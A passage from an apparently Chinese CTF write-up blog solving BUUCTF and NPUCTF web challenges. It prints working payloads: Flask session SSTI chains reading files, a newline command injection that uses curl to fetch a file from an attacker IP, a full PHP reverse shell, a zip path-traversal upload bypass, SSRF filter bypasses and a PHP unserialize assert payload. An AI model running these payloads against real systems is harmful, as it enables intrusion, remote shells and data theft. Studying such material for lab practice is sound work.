<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.eJyrVsozTM5PSVWyUqquVoiO1YuPT85JLC6Ojweycovy4-OjdQ1BosWlSWCJVKCUhma0qSVIMDMvswSsMj0nPykxB6IrqTQzpyQzD8hRUKitVaoFALt_IyQ.X8irqA.tYkx2Q2zmFaN_M5JnsennKV32nI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpWzQwXSB9fSJ9.X8isNQ.mwsFCJ2g4ZXyuONHb9SWzKEHrVk</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpIH19In0.X8isRA._rfFegMxGGcZG8hbm0Et10WBnFI</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKSB9fSJ9.X8isYg.HxdhLvdW6lQkPiK3HHLXq7safdU</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">bash: 未预期的符号“(”附近有语法错误</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKCkgfX0ifQ.X8isow.oTg9cFIhfKJan3dvrWECrR8Y4xs</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdIH19In0.X8iswQ.4rU8qOrp7diJa_N5IjdCwm0EvLQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;) &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykgfX0ifQ.X8is5w.TImXqmpXkV0tjZzmcVFAIvvFP28</span><br><span class="line">root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br><span class="line">eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykucmVhZCgpIH19In0.X8is9Q._7aNNdKqdaXGJ6mbSLLA1W9wjBQ</span><br><span class="line">root@kali:/flask-session-cookie-manager# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后才成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode  -t &quot;&#123;\&quot;n1code\&quot;: \&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="第二章-web进阶-死亡ping命令"><a href="#第二章-web进阶-死亡ping命令" class="headerlink" title="[第二章 web进阶]死亡ping命令"></a>[第二章 web进阶]死亡ping命令</h1><p>这个题目的ping能够出外网，所以我们只需要用%0a将ping换行绕过</p>
<p>之后curl [ip]/xxx.php &gt;&gt;/tmp/xx</p>
<p>php可以写一个反弹shell文件，这里比如我们用P牛的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">&quot;<span class="subst">$IP</span>&quot;</span>, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我们再执行命令</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">%0aphp /tmp/xx </span><br></pre></td></tr></table></figure>

<p>即可反弹shell</p>
<h1 id="第二章-web进阶-文件上传"><a href="#第二章-web进阶-文件上传" class="headerlink" title="[第二章 web进阶]文件上传"></a>[第二章 web进阶]文件上传</h1><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h3 id="1-apache自带的文件解析漏洞"><a href="#1-apache自带的文件解析漏洞" class="headerlink" title="1.apache自带的文件解析漏洞"></a>1.apache自带的文件解析漏洞</h3><p>如果apache读取文件的时候，后缀为其不可解析的文件名后缀，就会向上追溯，例如我们的apache解析</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">aaa.php.xxx</span><br></pre></td></tr></table></figure>

<p>因为apache无法解析xxx,所以apache就会解析前一个，就是aaa.php了【但是我们访问的时候依然用aaa.php.xxx去访问</p>
<h3 id="2-逻辑漏洞"><a href="#2-逻辑漏洞" class="headerlink" title="2.逻辑漏洞"></a>2.逻辑漏洞</h3><p>题目是给出源代码的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// 每5分钟会清除一次目录下上传的文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;pclzip.lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_FILES)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;文件上传章节练习题&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;style type=&quot;text/css&quot;&gt;</span></span><br><span class="line"><span class="string">        .login-box&#123;</span></span><br><span class="line"><span class="string">            margin-top: 100px;</span></span><br><span class="line"><span class="string">            height: 500px;</span></span><br><span class="line"><span class="string">            border: 1px solid #000;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        body&#123;</span></span><br><span class="line"><span class="string">            background: white;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .btn1&#123;</span></span><br><span class="line"><span class="string">            width: 200px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        .d1&#123;</span></span><br><span class="line"><span class="string">            display: block;</span></span><br><span class="line"><span class="string">            height: 400px;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;login-box col-md-12&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form class=&quot;form-horizontal&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;文件上传章节练习题&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;hr /&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;form-group&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;label class=&quot;col-sm-2 control-label&quot;&gt;选择文件：&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;input-group col-sm-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div &gt;</span></span><br><span class="line"><span class="string">                    &lt;label for=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/label&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-sm-8  text-right&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; class=&quot;btn btn-success text-right btn1&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$file)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;请勿上传空文件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $name = $file[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">&#x27;upload/&#x27;</span>;</span><br><span class="line">    $ext = strtolower(substr(strrchr($name, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">    $path = $dir.$name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_dir</span>(<span class="params">$dir</span>)</span>&#123;</span><br><span class="line">        $handle = opendir($dir);</span><br><span class="line">        <span class="keyword">while</span>(($f = readdir($handle)) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!in_array($f, <span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>)))&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_dir($dir.$f))&#123;</span><br><span class="line">                    check_dir($dir.$f.<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">                 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $ext = strtolower(substr(strrchr($f, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">if</span>(!in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">                        unlink($dir.$f);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $temp_dir = $dir.md5(time(). rand(<span class="number">1000</span>,<span class="number">9999</span>));</span><br><span class="line">    <span class="keyword">if</span>(!is_dir($temp_dir))&#123;</span><br><span class="line">        mkdir($temp_dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">if</span>($ext == <span class="string">&#x27;zip&#x27;</span>)&#123;</span><br><span class="line">            $archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;压缩包内不允许含有php文件!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class="number">0</span>) &#123;</span><br><span class="line">                check_dir($dir);</span><br><span class="line">                   <span class="keyword">exit</span>(<span class="string">&quot;解压失败&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;上传成功!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], $temp_dir.<span class="string">&#x27;/&#x27;</span>.$file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            check_dir($dir);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;上传成功!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;仅允许上传zip、jpg、gif、png文件!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心的点在check_dir这里，我们上下看一眼就知道我们是白名单上传，绕过就别想了，但是他允许我们上传zip，这样的话就有操作的空间了。注意这个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$archive = <span class="keyword">new</span> PclZip($file[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里涉及到了一个trick，该函数是存在目录穿越漏洞的！。也就是说如果我们的文件名为../../xx.php.xx</p>
<p><strong>就会被上传到其他目录</strong>，这里修改的话需要利用010editor来进行操作</p>
<p>之后我们可以看见：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($archive-&gt;listContent() <span class="keyword">as</span> $value)&#123;</span><br><span class="line">                $filename = $value[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.php$/&#x27;</span>, $filename))&#123;</span><br><span class="line">                     <span class="keyword">exit</span>(<span class="string">&quot;压缩包内不允许含有php文件!&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>逻辑是先解压文件，之后再check，但是利用该漏洞，check的时候文件已经被创建到其他文件夹去了，也就没办法check到了。</p>
<p>所以我们这里直接上传一个../../xx.php.xxx就行了</p>
<h1 id="第三章-web进阶-SSTI"><a href="#第三章-web进阶-SSTI" class="headerlink" title="[第三章 web进阶]SSTI"></a>[第三章 web进阶]SSTI</h1><p>简单题目，直接梭就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5d5ec153-1957-45a2-bff1-fda588f70774.node3.buuoj.cn&#x2F;?password&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat app&#x2F;server.py&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第三章-web进阶-Python里的SSRF"><a href="#第三章-web进阶-Python里的SSRF" class="headerlink" title="[第三章 web进阶]Python里的SSRF"></a>[第三章 web进阶]Python里的SSRF</h1><p>知识点：</p>
<p>关于SSRF，其实我也懂得不多..这道题题目给出提示让我们访问</p>
<p>8000 端口和 url path /api/internal/secret</p>
<p>这里是看过P牛的文章..</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leavesongs.com&#x2F;PYTHON&#x2F;defend-ssrf-vulnerable-in-python.html</span><br></pre></td></tr></table></figure>

<p>所以我们想要绕过只需要构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.233.233.233:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>

<p>除此之外，在linux当中0.0.0.0等效于127.0.0.1</p>
<p>故我们其实也可以构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;95cf0d10-668e-49cc-a0ac-3982c091dd6d.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;api&#x2F;internal&#x2F;secret</span><br></pre></td></tr></table></figure>

<p>还有：</p>
<ol>
<li>利用八进制IP地址绕过</li>
<li>利用十六进制IP地址绕过</li>
<li>利用十进制的IP地址绕过</li>
<li>利用IP地址的省略写法绕过</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">四种写法（5个例子）：012.0.0.1 、 0xa.0.0.1 、 167772161 、 10.1 、 0xA000001 实际上都请求的是10.0.0.1，但他们一个都匹配不上上述正则表达式。</span><br></pre></td></tr></table></figure>

<p>这里还提供一些ssrf的思路，比如：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误</span><br></pre></td></tr></table></figure>

<p>还有这么一个[xip服务] <a href="http://xip.io/">http://xip.io</a></p>
<p>暂且思考到这里：</p>
<h1 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h1><p>呃，就很奇怪？这道题的时候，index.php服务下的容器，可以直接127.0.0.1/flag.php就冲过去了</p>
<p><img src="image-20201204151421793.png" alt="image-20201204151421793"></p>
<p>但是还有个challenge.php,这个要难。给出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match_result=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,$url);</span><br><span class="line">    <span class="keyword">if</span> (!$match_result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $url_parse=parse_url($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $hostname=$url_parse[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $ip=gethostbyname($hostname);</span><br><span class="line">    $int_ip=ip2long($ip);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $result_info = curl_getinfo($ch);</span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url($result_info[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    safe_request_url($url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要trick在于parse_url和curl的解析会出现差异，当我们构造url为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a@127.0.0.1:80@baidu.com</span><br></pre></td></tr></table></figure>

<p>parse_url会解析后者，拿到手上的就是<a href="http://baidu.com,而curl实际上发送出去的请求为127.0.0.1/">http://baidu.com,而curl实际上发送出去的请求为127.0.0.1:80</a></p>
<p>注意一些，如果你需要访问某个页面，你需要添加的payload应该是：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?url=http://a@127.0.0.1:80@hacktest.com/flag.php</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>NPUCTF2020</title>
    <url>/2020/10/30/NPUCTF2020/</url>
    <content><![CDATA[<h1 id="web🐕"><a href="#web🐕" class="headerlink" title="web🐕"></a>web🐕</h1><p>列表内容复制粘贴，丢python里面跑一轮就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>啊，别看了，这上面太丢人了。。。原来是因为这是最后一步，</p>
<h1 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h1><p>这道题目和之前在网鼎杯做的phpweb很像，一样的是进行动调：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>flag说是在phpinfo当中,构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    